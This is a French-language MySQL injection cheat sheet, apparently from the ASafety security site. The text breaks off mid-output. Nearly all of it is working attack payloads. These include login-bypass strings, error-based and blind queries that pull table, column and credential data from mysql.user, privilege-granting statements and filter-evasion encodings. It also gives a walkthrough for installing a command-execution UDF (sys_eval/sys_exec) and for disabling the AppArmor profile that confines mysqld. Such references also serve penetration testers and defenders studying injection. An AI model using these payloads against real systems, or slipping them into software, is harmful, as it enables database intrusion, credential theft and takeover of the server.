ASafety » MySQL Injection Cheat Sheet

[![](../_resources/27953f5cd56da30a196cd7c4e855d71c.png)](https://www.asafety.fr/wp-content/uploads/MySQL.png)

Table des matières [[Cacher](https://www.asafety.fr/mysql-injection-cheat-sheet/#)]

- [1 Introduction](https://www.asafety.fr/mysql-injection-cheat-sheet/#Introduction)
- [2 Bases de données par défaut](https://www.asafety.fr/mysql-injection-cheat-sheet/#Bases_de_donnees_par_defaut)
- [3 Tester une injection](https://www.asafety.fr/mysql-injection-cheat-sheet/#Tester_une_injection)
    - [3.1 Injection dans une chaîne de caractères](https://www.asafety.fr/mysql-injection-cheat-sheet/#Injection_dans_une_chaine_de_caracteres)
    - [3.2 Injection par valeurs numériques](https://www.asafety.fr/mysql-injection-cheat-sheet/#Injection_par_valeurs_numeriques)
    - [3.3 Injection dans un formulaire de connexion/login](https://www.asafety.fr/mysql-injection-cheat-sheet/#Injection_dans_un_formulaire_de_connexionlogin)
- [4 Commenter la fin d’une requête](https://www.asafety.fr/mysql-injection-cheat-sheet/#Commenter_la_fin_drsquoune_requete)
- [5 Test de version MySQL](https://www.asafety.fr/mysql-injection-cheat-sheet/#Test_de_version_MySQL)
- [6 Crédentiels de la base de données](https://www.asafety.fr/mysql-injection-cheat-sheet/#Credentiels_de_la_base_de_donnees)
- [7 Gestion des utilisateurs](https://www.asafety.fr/mysql-injection-cheat-sheet/#Gestion_des_utilisateurs)
    - [7.1 Création d’un nouvel utilisateur](https://www.asafety.fr/mysql-injection-cheat-sheet/#Creation_drsquoun_nouvel_utilisateur)
    - [7.2 Suppression d’un utilisateur](https://www.asafety.fr/mysql-injection-cheat-sheet/#Suppression_drsquoun_utilisateur)
    - [7.3 Escalade de privilège d’un utilisateur](https://www.asafety.fr/mysql-injection-cheat-sheet/#Escalade_de_privilege_drsquoun_utilisateur)
- [8 Noms des bases de données](https://www.asafety.fr/mysql-injection-cheat-sheet/#Noms_des_bases_de_donnees)
- [9 Nom d’hôte du serveur](https://www.asafety.fr/mysql-injection-cheat-sheet/#Nom_drsquohote_du_serveur)
- [10 Serveur UID et adresse MAC](https://www.asafety.fr/mysql-injection-cheat-sheet/#Serveur_UID_et_adresse_MAC)
- [11 Tables et colonnes](https://www.asafety.fr/mysql-injection-cheat-sheet/#Tables_et_colonnes)
    - [11.1 Déterminer le nombre de colonnes](https://www.asafety.fr/mysql-injection-cheat-sheet/#Determiner_le_nombre_de_colonnes)
    - [11.2 Récupérer le nom des tables](https://www.asafety.fr/mysql-injection-cheat-sheet/#Recuperer_le_nom_des_tables)
    - [11.3 Récupérer le nom des colonnes](https://www.asafety.fr/mysql-injection-cheat-sheet/#Recuperer_le_nom_des_colonnes)
    - [11.4 Récupérer plusieurs tables/colonnes en une fois](https://www.asafety.fr/mysql-injection-cheat-sheet/#Recuperer_plusieurs_tablescolonnes_en_une_fois)
    - [11.5 Trouver des tables à partir d’une colonne](https://www.asafety.fr/mysql-injection-cheat-sheet/#Trouver_des_tables_a_partir_drsquoune_colonne)
    - [11.6 Trouver des colonnes à partir d’une table](https://www.asafety.fr/mysql-injection-cheat-sheet/#Trouver_des_colonnes_a_partir_drsquoune_table)
- [12 Récupère les requêtes courantes](https://www.asafety.fr/mysql-injection-cheat-sheet/#Recupere_les_requetes_courantes)
- [13 Éviter l’utilisation des quotes](https://www.asafety.fr/mysql-injection-cheat-sheet/#Eviter_lrsquoutilisation_des_quotes)
    - [13.1 Encodage en hexadécimal](https://www.asafety.fr/mysql-injection-cheat-sheet/#Encodage_en_hexadecimal)
    - [13.2 Fonction CHAR()](https://www.asafety.fr/mysql-injection-cheat-sheet/#Fonction_CHAR)
    - [13.3 Encodage en binaire](https://www.asafety.fr/mysql-injection-cheat-sheet/#Encodage_en_binaire)
- [14 Concaténation de chaîne de caractères](https://www.asafety.fr/mysql-injection-cheat-sheet/#Concatenation_de_chaine_de_caracteres)
- [15 Les requêtes conditionnelles](https://www.asafety.fr/mysql-injection-cheat-sheet/#Les_requetes_conditionnelles)
- [16 Gestion du temps](https://www.asafety.fr/mysql-injection-cheat-sheet/#Gestion_du_temps)
- [17 Privilèges et droits](https://www.asafety.fr/mysql-injection-cheat-sheet/#Privileges_et_droits)
- [18 Exécution de commande sur le serveur](https://www.asafety.fr/mysql-injection-cheat-sheet/#Execution_de_commande_sur_le_serveur)
- [19 Lecture de fichier du serveur](https://www.asafety.fr/mysql-injection-cheat-sheet/#Lecture_de_fichier_du_serveur)
- [20 Écriture de fichier sur le serveur](https://www.asafety.fr/mysql-injection-cheat-sheet/#Ecriture_de_fichier_sur_le_serveur)
- [21 Requêtes distantes](https://www.asafety.fr/mysql-injection-cheat-sheet/#Requetes_distantes)
    - [21.1 Requêtes DNS externes](https://www.asafety.fr/mysql-injection-cheat-sheet/#Requetes_DNS_externes)
    - [21.2 Requêtes Samba](https://www.asafety.fr/mysql-injection-cheat-sheet/#Requetes_Samba)
- [22 Requêtes empilées](https://www.asafety.fr/mysql-injection-cheat-sheet/#Requetes_empilees)
- [23 Requêtes multi-versions](https://www.asafety.fr/mysql-injection-cheat-sheet/#Requetes_multi-versions)
- [24 Obscurcissement de requêtes](https://www.asafety.fr/mysql-injection-cheat-sheet/#Obscurcissement_de_requetes)
    - [24.1 Caractères intermédiaires de séparation](https://www.asafety.fr/mysql-injection-cheat-sheet/#Caracteres_intermediaires_de_separation)
    - [24.2 Caractères intermédiaires pour AND/OR](https://www.asafety.fr/mysql-injection-cheat-sheet/#Caracteres_intermediaires_pour_ANDOR)
    - [24.3 Obscurcissement via les commentaires](https://www.asafety.fr/mysql-injection-cheat-sheet/#Obscurcissement_via_les_commentaires)
    - [24.4 Encodage](https://www.asafety.fr/mysql-injection-cheat-sheet/#Encodage)
    - [24.5 Éviter les mots clés](https://www.asafety.fr/mysql-injection-cheat-sheet/#Eviter_les_mots_cles)
    - [24.6 Transcodage de chaînes de caractères](https://www.asafety.fr/mysql-injection-cheat-sheet/#Transcodage_de_chaines_de_caracteres)
- [25 Opérateurs](https://www.asafety.fr/mysql-injection-cheat-sheet/#Operateurs)
- [26 Constantes](https://www.asafety.fr/mysql-injection-cheat-sheet/#Constantes)
- [27 Optimisation des requêtes](https://www.asafety.fr/mysql-injection-cheat-sheet/#Optimisation_des_requetes)
- [28 Mots de passe](https://www.asafety.fr/mysql-injection-cheat-sheet/#Mots_de_passe)
    - [28.1 Hachage](https://www.asafety.fr/mysql-injection-cheat-sheet/#Hachage)
    - [28.2 Cassage](https://www.asafety.fr/mysql-injection-cheat-sheet/#Cassage)
- [29 Sources & ressources](https://www.asafety.fr/mysql-injection-cheat-sheet/#Sources_ressources)

## Introduction

Ce document recense de manière synthétique et la plus complète possible, l’ensemble des vecteurs d’attaque pour des injections SQL (SQLi & BSQLi) ciblant les bases de données MySQL.

Toutes les syntaxes, requêtes, codes sources, PoC et exemples ont été testés et validés pour la production de cette synthèse.

## Bases de données par défaut

|     |     |
| --- | --- |
| mysql | Nécessite les privilèges root |
| information_schema | Disponible depuis la version 5 |

## Tester une injection

### Injection dans une chaîne de caractères

**Pour la requête suivante :**
SELECT * FROM Table WHERE data = '[INJ]';

|     |     |     |
| --- | --- | --- |
| ‘   | Simple quote x1 | False |
| ‘ ‘ | Simple quote x2 | True |
| «   | Double quote x1 | False |
| «  » | Double quote x2 | True |
| \   | Backslash x1 | False |
| \\  | Backslash x2 | True |

**Exemples :**
SELECT * FROM Table WHERE data = 'xxx''';
SELECT * FROM Table WHERE data = '1'''''''''''UNION SELECT '2';
**Remarques :**

- Il est possible d’utiliser autant d’apostrophe (*quote*) et de guillemet (*double-quote*) tant qu’ils vont par paire.
- Il est possible de continuer la requête à la suite d’une chaîne de quote.
- Une quote échappe une seconde quote, d’où le chaînage par paire.

### Injection par valeurs numériques

**Pour la requête suivante :**
SELECT * FROM Table WHERE data = [INJ];

|     |     |
| --- | --- |
| AND 1 | True |
| AND 0 | False |
| AND true | True |
| AND false | False |
| 1-false | Retourne 1 si vulnérable |
| 1-true | Retourne 0 si vulnérable |
| 1*1337 | Retourne 1337 si vulnérable |

**Format numériques valides :**

Chacune de ces techniques peut servir d’évasion d’expressions régulières d’IDS/WAF.

|     |     |
| --- | --- |
| digits | 1337 |
| digits[.] | 1337. |
| digits[.]digits | 13.37 |
| digits[eE]digits | 13e37, 13E37 |
| digits[eE][+-]digits | 13e-37, 13E+37 |
| digits[.][eE]digits | 13.e37 |
| digits[.]digits[eE]digits | 13.3E7 |
| digits[.]digits[eE][+-]digits | 13.3e-7 |
| [.]digits | .1337 |
| [.]digits[eE]digits | .13e37 |
| [.]digits[eE][+-]digits | .13E-37 |

**Expressions mathématiques équivalentes :**

Pour des injections équivalentes au traditionnel « OR 1=1 », les syntaxes suivantes (et dérivées) peuvent être utilisées :

COS(0)=SIN(PI()/2)
COS(@@VERSION)=SIN(@@VERSION+PI()/2)
**Exemples :**
SELECT * FROM Table WHERE data = 3+1337;
**Remarques :**

- Le booléen true équivaut à l’entier 1
- Le booléen false équivaut à l’entier 0

### Injection dans un formulaire de connexion/login

**Pour la requête suivante :**
SELECT * FROM Users WHERE username = 'admin' AND password = '[INJ]';
**Injections :**
' OR 1 -- -
' OR '' = '
' OR 1 = 1 -- -
'='
'LIKE'
'=0--+
**Exemples :**
SELECT * FROM Users WHERE username = 'admin' AND password = '' OR '' = '';

## Commenter la fin d’une requête

Les syntaxes suivantes peuvent être utilisées pour commenter (désactiver) la fin d’une requête à la suite d’une injection :

|     |     |
| --- | --- |
| #   | Hash commentaire |
| /*  | C-style commentaire |
| — – | SQL commentaire |
| ;%00 | Nullbyte,fin de chaîne |
| `   | backtick |

**Exemples :**
SELECT * FROM Table WHERE username = '' OR 1=1 -- -' AND password = '';
SELECT * FROM Table WHERE data = '' UNION SELECT 1, 2, 3`';
**Remarques :**

- Le *backtick* ne peut être utilisé qu’en terminaison d’une requête utilisée comme un alias.

## Test de version MySQL

- VERSION()
- @@VERSION
- @@GLOBAL.VERSION

**Exemples :**

SELECT * FROM Tables WHERE data = '1' AND MID(VERSION(),1,1) = '5'; -- true if MySQL 5

SELECT@@version -- shorter than SELECT VERSION()
**Remarques :**

- La chaîne de caractères correspondante à la version retournée peut contenir « -nt-log » dans le cas d’un déploiement du serveur SQL sous un environnement Windows.
- Ces mots-clés et fonctions ne sont pas sensibles à la casse.

## Crédentiels de la base de données

- Table (privilèges root requis) : mysql.user
- Colonnes : user, password
- Utilisateur courant : user(), current_user(), current_user, system_user(), session_user()

**Exemples :**
SELECT current_user;

SELECT CONCAT_WS(0x3A, user, password) FROM mysql.user WHERE user = 'root'-- (Privileged)

**Remarques :**

- Mots-clés et fonctions insensibles à la casse.

## Gestion des utilisateurs

Chacune de ces requêtes de gestion des utilisateurs nécessite des droits.

### Création d’un nouvel utilisateur

CREATE USER login IDENTIFIED BY 'password';

### Suppression d’un utilisateur

DROP USER login;

### Escalade de privilège d’un utilisateur

GRANT ALL PRIVILEGES ON *.* TO login@'%';

## Noms des bases de données

- Tables : mysql.db (privilèges root requis), information_schema.schemata (MySQL >= 5)
- Colonnes : db, schema_name
- Base de données courante : database(), schema()

**Exemples :**
SELECT database();
SELECT schema_name FROM information_schema.schemata;
SELECT DISTINCT(db) FROM mysql.db;-- (Privileged)
**Remarques :**

- Fonctions non sensibles à la casse.

## Nom d’hôte du serveur

- @@HOSTNAME

**Exemples :**
SELECT @@hostname;
**Remarques :**

- Mot-clé insensible à la casse.

## Serveur UID et adresse MAC

L’UUID (*Universally Unique Identifier*) est un nombre sur 128 bits formé à partir de l’adresse MAC de l’interface en écoute.

- UUID()

**Exemples :**
aaaaaaaa-bbbb-cccc-dddd-eeeeeeeeeeee;
**Remarques :**

- Les 12 dernières caractères représenté par la lettre « e » correspondent à l’adresse MAC.
- Certains OS retournent 48 bits aléatoires à la place de l’adresse MAC, ce n’est pas le cas de Windows.
- Fonction insensible à la casse.

## Tables et colonnes

### Déterminer le nombre de colonnes

#### Via « order by »

- ORDER BY N+1;

**Remarques :**

- Continuer d’incrémenter la valeur de N jusqu’à ce que la réponse soit false (une erreur).

**Exemples :**
Pour la requête suivante :
SELECT * FROM Table WHERE data = '[INJ]';

|     |     |
| --- | --- |
| 1′ ORDER BY 1–+ | True |
| 1′ ORDER BY 2–+ | True |
| 1′ ORDER BY 3–+ | True |
| 1′ ORDER BY 4–+ | False – La requête ne dispose que de 3 colonnes |
| -1′ UNION SELECT 1,2,3–+ | True |

#### Via les erreurs

AND (SELECT * FROM SOME_EXISTING_TABLE) = 1
**Remarques :**

- Cette syntaxe fonctionne si l’on connait le nom de la table dont on cherche le nombre de colonnes ; et si l’affichage des erreurs est activé.
- La requête retournera une erreur indiquant le nombre de colonnes dans la table, et non pas la requête en elle-même.

**Exemple :**
SELECT * FROM Tables WHERE data = [INJ]
Avec l’injection :
AND (SELECT * FROM Unknown_Table) = 1
Erreur retournée :
**
> Operand should contain 3 column(s)
**

### Récupérer le nom des tables

#### Via « Union »

UNION SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE version=10;

**Remarques :**

- Version=9 pour MySQL v4
- Version=10 pour MySQL v5

#### En mode aveugle « Blind »

AND SELECT SUBSTR(table_name,1,1) FROM information_schema.tables > 'A';

AND 1=(SELECT 1 FROM information_schema.tables WHERE TABLE_SCHEMA="myDB" AND table_name REGEXP '^[a-z]' LIMIT 0,1)

**Remarques :**

- Appliquer un algorithme dichotomique sur la première requête pour optimiser le temps de recherche et le trafic réseau (O(log n)).
- Privilégier la seconde pour réduire encore le nombre de requête.

#### Via les erreurs

AND(SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT(SELECT(SELECT DISTINCT CONCAT(0x7e,0x27,CAST(table_name as char),0x27,0x7e) FROM information_schema.tables WHERE table_schema='[DB_NAME]' LIMIT N,1)) FROM information_schema.tables LIMIT 0,1),FLOOR(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)

**Remarques :**

- Indiquer le nom de la base de données dont les noms des tables sont à extraire.
- Faire évoluer la valeur de N de 0 à X pour récupérer le nom de chaque table dans les erreurs.

**Résultats :**
**
> #1062 – Duplicate entry ‘~’myTable’~1’ for key ‘group_key’
**

AND ExtractValue(1, CONCAT(0x5c, (SELECT table_name FROM information_schema.tables LIMIT N,1)));-- Available in 5.1.5

**Résultats :**
**
> #1105 – XPATH syntax error: ‘\myTable’
**
**Remarques :**

- Cette seconde méthode, présente depuis MySQL 5.1.5, ne nécessite pas de nom de base.
- Faire évoluer la valeur de N de 0 à X pour récupérer le nom de chaque table dans les erreurs.

### Récupérer le nom des colonnes

#### Via « Union »

UNION SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name = 'tablename'

#### En mode aveugle « Blind »

AND SELECT SUBSTR(column_name,1,1) FROM information_schema.columns > 'A'
**Remarques :**

- Appliquer un algorithme dichotomique pour optimiser les requêtes, le temps de recherche et le trafic réseau (O(log n)).

#### Via les erreurs

AND(SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT(SELECT(SELECT DISTINCT CONCAT(CAST(column_name as char)) FROM information_schema.columns WHERE table_schema='[DB NAME]' AND table_name='[TABLE_NAME]' LIMIT N,1)) FROM information_schema.tables LIMIT 0,1),floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)

**Remarques :**

- Indiquer le nom de la base de données cible, ainsi que le nom de la table dans laquelle extraire les colonnes.
- Faire évoluer la valeur de N de 0 à X pour récupérer le nom de chaque colonne dans les erreurs.

**Résultats :**
**
> #1062 – Duplicate entry ‘myColumn’ for key ‘group_key’
**

AND ExtractValue(1, CONCAT(0x5c, (SELECT column_name FROM information_schema.columns LIMIT N,1)));-- Available in MySQL 5.1.5

**Remarques :**

- Cette seconde méthode, présente depuis MySQL 5.1.5, ne nécessite pas de nom de base ni de nom de table.
- Faire évoluer la valeur de N de 0 à X pour récupérer le nom de chaque colonne dans les erreurs.

**Résultats :**
**
> #1105 – XPATH syntax error: ‘\myColumn’
**

#### Via la procédure « ANALYSE() »

- PROCEDURE ANALYSE()

**Remarques :**

- Il est nécessaire que l’application (web) vulnérable à l’injection SQL affiche la première colonne résultante de la requête.

**Exemples :**
Pour la requête suivante :
SELECT * FROM Table WHERE data=[INJ]

|     |     |
| --- | --- |
| 1 PROCEDURE ANALYSE() | Récupère le nom de la première colonne de la table |
| 1 LIMIT 1,1 PROCEDURE ANALYSE() | Récupère le nom de la seconde colonne |
| 1 LIMIT 2,1 PROCEDURE ANALYSE() | Récupère le nom de la troisième colonne… |

### Récupérer plusieurs tables/colonnes en une fois

#### Technique n°1

SELECT (@) FROM (SELECT(@:=0x00),(SELECT (@) FROM (information_schema.columns) WHERE (table_schema>=@) AND (@)IN (@:=CONCAT(@,0x0a,' [ ',table_schema,' ] >',table_name,' > ',column_name))))x

**Exemples :**

SELECT * FROM Table WHERE data = '-1' UNION SELECT 1, 2, (SELECT (@) FROM (SELECT(@:=0x00),(SELECT (@) FROM (information_schema.columns) WHERE (table_schema>=@) AND (@)IN (@:=CONCAT(@,0x0a,' [ ',table_schema,' ] >',table_name,' > ',column_name))))x), 4--+';

**Résultats :**
[ information_schema ] >CHARACTER_SETS > CHARACTER_SET_NAME
[ information_schema ] >CHARACTER_SETS > DEFAULT_COLLATE_NAME
[ information_schema ] >CHARACTER_SETS > DESCRIPTION
[ information_schema ] >CHARACTER_SETS > MAXLEN
[ information_schema ] >COLLATIONS > COLLATION_NAME
[ information_schema ] >COLLATIONS > CHARACTER_SET_NAME
[ information_schema ] >COLLATIONS > ID
[ information_schema ] >COLLATIONS > IS_DEFAULT
[ information_schema ] >COLLATIONS > IS_COMPILED
**Remarques :**

- Le résultat est sous la forme d’un fichier BLOB s’il est conséquent.

#### Technique n°2

SELECT MID(GROUP_CONCAT(0x3c62723e, 0x5461626c653a20, table_name, 0x3c62723e, 0x436f6c756d6e3a20, column_name ORDER BY (SELECT version FROM information_schema.tables) SEPARATOR 0x3c62723e),1,1024) FROM information_schema.columns

**Exemples :**

SELECT column FROM Table WHERE data = '-1' UNION SELECT MID(GROUP_CONCAT(0x3c62723e, 0x5461626c653a20, table_name, 0x3c62723e, 0x436f6c756d6e3a20, column_name ORDER BY (SELECT version FROM information_schema.tables) SEPARATOR 0x3c62723e),1,1024) FROM information_schema.columns--+';

Résultats :
Table: myTable1
Column: login
Table: myTable1
Column: userid
Table: myTable1
Column: password
Table: myTable2
Column: data
**Remarques :**

- Le formatage de sortie est en HTML, avec des retours à la ligne pour un meilleur affichage.

### Trouver des tables à partir d’une colonne

SELECT table_name FROM information_schema.columns WHERE column_name = 'myColumn';

SELECT table_name FROM information_schema.columns WHERE column_name LIKE '%Col%';

### Trouver des colonnes à partir d’une table

SELECT column_name FROM information_schema.columns WHERE table_name = 'myTable';

SELECT column_name FROM information_schema.columns WHERE table_name LIKE '%Tab%';

## Récupère les requêtes courantes

SELECT info FROM information_schema.processlist
**Remarques :**

- Disponible depuis MySQL 5.1.7

## Éviter l’utilisation des quotes

### Encodage en hexadécimal

SELECT * FROM Users WHERE username = 0x61646D696E;
SELECT * FROM Users WHERE username = x'61646D696E'; -- use quotes
**Remarques :**

- Le préfixe « 0x » d’une chaîne encodée en hexadécimal est sensible à la casse ; alors que le préfixe « x' » ne l’est pas.
- Une chaîne vierge en notation hexadécimale ne peut se noter 0x, mais x ».
- Attention, « SELECT 0x6164 » est une chaîne de caractères, mais « SELECT 0x61+0x64 » est un entier.

### Fonction CHAR()

SELECT * FROM Users WHERE username = CHAR(97, 100, 109, 105, 110)

### Encodage en binaire

SELECT * FROM Users WHERE username = 0b0110000101100100011011010110100101101110;

SELECT * FROM Users WHERE username = b'0110000101100100011011010110100101101110'; -- use quotes

**Remarques :**

- Le préfixe « 0b » d’une chaîne encodée en binaire est sensible à la casse ; alors que le préfixe « b' » ne l’est pas.
- Une chaîne vierge en notation binaire ne peut se noter 0b, mais b ».

## Concaténation de chaîne de caractères

SELECT 'a' 'd' 'mi' 'n';
SELECT 'ad' "min";
SELECT 'a' 'd' 'mi' 'n';
SELECT CONCAT('a', 'd', 'm', 'i', 'n');
SELECT CONCAT_WS('', 'a', 'd', 'm', 'i', 'n');
SELECT GROUP_CONCAT('a', 'd', 'm', 'i', 'n');
**Remarques :**

- CONCAT() retourne NULL si au moins un de ses arguments est NULL. Préférer CONCAT_WS() (*with separator*).
- Le premier argument de CONCAT_WS() défini le séparateur pour le reste des arguments.

## Les requêtes conditionnelles

- CASE
- IF()
- IFNULL()
- NULLIF()

**Exemples :**
SELECT IF(1=1, true, false);
SELECT CASE WHEN 1=1 THEN true ELSE false END;

## Gestion du temps

- SLEEP() (MySQL v5.0.12)
- BENCHMARK() (MySQL v4 et v5)

**Exemples :**
' - (IF(MID(version(),1,1) LIKE 5, BENCHMARK(100000,SHA1('true')), false)) - '
**Remarques :**

- L’utilisation du temps de réponse en forçant le serveur SQL à exécuter des calculs de benchmark() ou à faire un sleep() est une technique couramment utilisée pour les injections SQL en aveugle (BSQLi). Le temps de réponse de l’application ciblée joue le rôle d’un booléen (court = true, long = false).

## Privilèges et droits

Les requêtes qui suivent permettent de déterminer si un utilisateur dispose du privilège « FILE » ou listent tous les privilèges.

Les privilèges root sont requis, compatible MySQL v4 et v5 :
SELECT file_priv FROM mysql.user WHERE user = 'username';

SELECT host, user, Select_priv, Insert_priv, Update_priv, Delete_priv, Create_priv, Drop_priv, Reload_priv, Shutdown_priv, Process_priv, File_priv, Grant_priv, References_priv, Index_priv, Alter_priv, Show_db_priv, Super_priv, Create_tmp_table_priv, Lock_tables_priv, Execute_priv, Repl_slave_priv, Repl_client_priv FROM mysql.user;

Pas de privilège requis (MySQL v5) :

SELECT grantee, is_grantable FROM information_schema.user_privileges WHERE privilege_type = 'file' AND grantee like '%username%';

SELECT grantee, privilege_type, is_grantable FROM information_schema.user_privileges;

Privilèges sur une base de données (MySQL v5) :

SELECT grantee, table_schema, privilege_type FROM information_schema.schema_privileges;

Privilèges sur les tables et colonnes (MySQL v5) :

SELECT table_schema, table_name, column_name, privilege_type FROM information_schema.column_privileges;

## Exécution de commande sur le serveur

Les bases de données MySQL disposent d’une API de développement de fonctions utilisateurs. Ces fonctions, nommées UDF pour *User-Defined Function*, sont stockées compilées dans des bibliothèques partagées (DLL sous Windows et SO sous Linux). Ces bibliothèques personnalisées nécessitent que des prototypes de fonctions précis soient implémentés. Les versions 5 de MySQL ont instauré de nouvelles spécifications quant à ces points d’entrés.

Pour exécuter des commandes sur un serveur MySQL, il est donc nécessaire de créer une bibliothèque qui renferme une fonction UDF d’exécution de commandes arbitraires. Ce fichier doit être placé dans le répertoire des bibliothèques MySQL pour être chargé à chaud (/usr/lib/ ou /usr/lib/mysql/plugin/ généralement). Une fois la bibliothèque en place, elle peut être utilisée directement au travers de requêtes SELECT.

Les premiers PoC exploitant les mécanismes UDF pour l’obtention d’un shell au travers de MySQL proviennent de [Marco Ivaldi](http://www.0xdeadbeef.info/). Ces PoC ([raptor_udf](http://www.0xdeadbeef.info/exploits/raptor_udf.c), [raptor_udf2](http://www.0xdeadbeef.info/exploits/raptor_udf2.c), [raptor_winudf](http://www.0xdeadbeef.info/exploits/raptor_winudf.tgz)) présentent toutefois deux principales limitations :

- Ils ne sont pas conformes aux nouvelles normes UDF de MySQL 5
- Ils exploitent la fonction C system(), qui ne fait que retourner le code de retour de la commande exécutée.

Depuis ces PoC qui datent de 2006, de nouvelles adaptations ont vu le jour, notamment au travers du projet/dépôt [MySQL User-Defined Functions](http://www.mysqludf.org/) maintenu par [Roland Bouman](http://rpbouman.blogspot.fr/) et divers contributeurs. Une des bibliothèques qui y est présente se nomme [lib_mysqludf_sys](https://github.com/mysqludf/lib_mysqludf_sys#readme).  Elle permet l’utilisation de plusieurs fonctions au travers de MySQL, et ce, totalement compatible avec les dernières versions de la base de données. Les fonctions d’intérêt sont :

- sys_exec() : exécute la commande passée en paramètre et retourne le code de retour de la commande.
- sys_eval() : exécute la commande passée en paramètre et retourne la sortie standard de la commande. Cette dernière se doit à la contribution de [Bernardo Damele](http://bernardodamele.blogspot.fr/2009/01/command-execution-with-mysql-udf.html).
- sys_get() : récupère la valeur d’une variable d’environnement.
- sys_set() : défini une valeur pour une variable d’environnement.

En guise de démonstration de l’utilisation de cette bibliothèque partagée, les scénarios suivants ont été réalisés sur une Ubuntu Server 12.04.2 LTS. Sur un tel serveur, les bibliothèques de MySQL sont installées par défaut dans /usr/lib/mysql/plugin/. Pour la création de nouvelles bibliothèques directement compilées sur le serveur, le package « apt-get install libmysqlclient-dev » est nécessaire.

$ wget https://github.com/mysqludf/lib_mysqludf_sys/archive/master.zip
$ unzip master.zip
$ cd lib_mysqludf_sys-master/
$ nano Makefile
LIBDIR=/usr/lib/mysql/plugin
install:

gcc -fPIC -Wall -I/usr/include/mysql -I. -shared lib_mysqludf_sys.c -o $(LIBDIR)/lib_mysqludf_sys.so

$ sudo ./install.sh
Compiling the MySQL UDF

gcc -fPIC -Wall -I/usr/include/mysql -I. -shared lib_mysqludf_sys.c -o /usr/lib/mysql/plugin/lib_mysqludf_sys.so

MySQL UDF compiled successfully
Please provide your MySQL root password
Enter password:
MySQL UDF installed successfully

Il est conseillé d’ajouter le flag « -fPIC » dans le Makefile. Adapter également le chemin d’accès LIBDIR en fonction de l’installation de MySQL courante.

Le -fPIC (*Position Independent Code*) permet la compilation de bibliothèques partagées, et évite ainsi des erreurs du type :

$ sudo ./install.sh
Compiling the MySQL UDF

gcc -Wall -I/usr/include/mysql -I. -shared lib_mysqludf_sys.c -o /usr/lib/mysql/plugin/lib_mysqludf_sys.so

/usr/bin/ld: /tmp/ccvGSwBo.o: relocation R_X86_64_32 against `.rodata' can not be used when making a shared object; recompile with -fPIC

/tmp/ccvGSwBo.o: could not read symbols: Bad value
collect2: ld a retourné 1 code d'état d'exécution
make: *** [install] Erreur 1
ERROR: You need libmysqlclient development software installed
to be able to compile this UDF, on Debian/Ubuntu just run:
apt-get install libmysqlclient15-dev

Le script d’auto-installation de la bibliothèque, install.sh, réalise automatiquement la compilation, le placement de la bibliothèque dans le bon répertoire de MySQL (privilège root nécessaire), et ajoute les définitions des fonctions au sein de MySQL (d’où la demande de mot de passe root MySQL). La déclaration de ces nouvelles fonctions MySQL se fait par le biais du script automatiquement appelé :

DROP FUNCTION IF EXISTS lib_mysqludf_sys_info;
DROP FUNCTION IF EXISTS sys_get;
DROP FUNCTION IF EXISTS sys_set;
DROP FUNCTION IF EXISTS sys_exec;
DROP FUNCTION IF EXISTS sys_eval;

CREATE FUNCTION lib_mysqludf_sys_info RETURNS string SONAME 'lib_mysqludf_sys.so';

CREATE FUNCTION sys_get RETURNS string SONAME 'lib_mysqludf_sys.so';
CREATE FUNCTION sys_set RETURNS int SONAME 'lib_mysqludf_sys.so';
CREATE FUNCTION sys_exec RETURNS int SONAME 'lib_mysqludf_sys.so';
CREATE FUNCTION sys_eval RETURNS string SONAME 'lib_mysqludf_sys.so';

Une fois la bibliothèque compilée, installée, déclarée et chargée, son utilisation est d’une grande facilité au travers des requêtes SELECT :

$ mysql -u root -p mysql
Enter password:
mysql> SELECT sys_eval('id');
+--------------------------------------------------+

| sys_eval('id') |

+--------------------------------------------------+

| uid=106(mysql) gid=114(mysql) groups=114(mysql)

|
+--------------------------------------------------+
1 row in set (0.01 sec)
mysql> SELECT sys_exec('id');
+----------------+

| sys_exec('id') |

+----------------+

| 0 |

+----------------+
1 row in set (0.00 sec)
mysql>

Sur certains environnements, un logiciel de [contrôle d’accès mandataire](https://fr.wikipedia.org/wiki/Contr%C3%B4le_d'acc%C3%A8s_obligatoire) bloque l’utilisation de ces bibliothèques ([SELinux](https://fr.wikipedia.org/wiki/SELinux) ou [AppArmor](https://fr.wikipedia.org/wiki/AppArmor) par exemple). Ces logiciels confinent l’exécution de processus/service pour qu’ils n’accèdent qu’aux entités du système dont ils ont besoin (fichiers, répertoires, sockets, utilisateurs…). Par défaut, ces systèmes sécurisent les logiciels populaires via des profiles prédéfinis, comme c’est le cas pour MySQL. Il convient donc de désactiver le profile MySQL avant de pouvoir utiliser cette bibliothèque. Sous Ubuntu Server, AppArmor protège nativement MySQL :

$ apparmor_status # or aa-status
apparmor module is loaded.
5 profiles are loaded.
5 profiles are in enforce mode.
/sbin/dhclient
/usr/lib/NetworkManager/nm-dhcp-client.action
/usr/lib/connman/scripts/dhclient-script
/usr/sbin/mysqld
/usr/sbin/tcpdump
0 profiles are in complain mode.
2 processes have profiles defined.
2 processes are in enforce mode.
/sbin/dhclient (592)
/usr/sbin/mysqld (5875)
0 processes are in complain mode.
0 processes are unconfined but have a profile defined.
$ cat /sys/kernel/security/apparmor/profiles
/usr/sbin/mysqld (enforce)
/usr/sbin/tcpdump (enforce)
/usr/lib/connman/scripts/dhclient-script (enforce)
/usr/lib/NetworkManager/nm-dhcp-client.action (enforce)
/sbin/dhclient (enforce)

Si MySQL est protégé par un tel logiciel de contrôle d’accès mandataire, l’appel aux fonctions UDF sys_exec() ou sys_eval() ne retourne par les résultats attendus :

$ mysql -u root -p mysql
Enter password:
mysql> SELECT sys_eval('id');
+----------------+

| sys_eval('id') |

+----------------+

| |

+----------------+
1 row in set (0.00 sec)
mysql> SELECT sys_exec('id');
+----------------+

| sys_exec('id') |

+----------------+

| 32512 |

+----------------+
1 row in set (0.00 sec)
mysql>
Pour désactiver la surveillance de MySQL :
$ sudo ln -s /etc/apparmor.d/usr.sbin.mysqld /etc/apparmor.d/disable/
$ sudo apparmor_parser -R /etc/apparmor.d/usr.sbin.mysqld
$ aa-status
apparmor module is loaded.
4 profiles are loaded.
4 profiles are in enforce mode.
/sbin/dhclient
/usr/lib/NetworkManager/nm-dhcp-client.action
/usr/lib/connman/scripts/dhclient-script
/usr/sbin/tcpdump
